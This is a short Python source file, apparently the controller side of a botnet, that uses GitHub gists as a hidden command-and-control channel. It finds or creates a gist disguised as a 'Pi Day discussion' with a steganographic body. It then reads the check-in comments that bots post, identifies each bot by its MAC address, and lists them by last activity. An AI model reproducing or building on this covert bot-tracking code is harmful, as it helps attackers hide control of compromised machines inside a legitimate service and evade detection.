from api_wrapper import get_gist_id_from_description, get_comments, create_gist
from utils import time_ago, hex_to_pretty_mac
from names_generator import generate_name
from datetime import datetime
import steganography
import re


def get_bots():
    # In the "Pi Day discussion" gist, bots will comment (or update) whenever they are alive
    alive_gist_id = get_gist_id_from_description("Pi Day discussion") or None
    
    # Create the gist if it does not exist
    if not alive_gist_id:
        create_gist("Pi Day discussion", steganography.pi_day_discussion_body, file_name="pi.md")
        alive_gist_id = get_gist_id_from_description("Pi Day discussion")
    
    comments = get_comments(alive_gist_id, cipher=False)

    # Remove non-digits from the body. This will be a unique ID of the bot, based on its MAC address
    bots = [{'id': re.sub(r"\D", "", c['body']),
             'mac': hex_to_pretty_mac(re.sub(r"\D", "", c['body'])),
             'name': generate_name(seed=re.sub(r"\D", "", c['body'])),
             'update_date': datetime.strptime(c['updated_at'], '%Y-%m-%dT%H:%M:%SZ'),
             'simplified_update_date': time_ago(datetime.strptime(c['updated_at'], '%Y-%m-%dT%H:%M:%SZ'))} for c in comments]

    # Sort and show first the last available bots
    return sorted(bots, key=lambda k: k['update_date'], reverse=True)
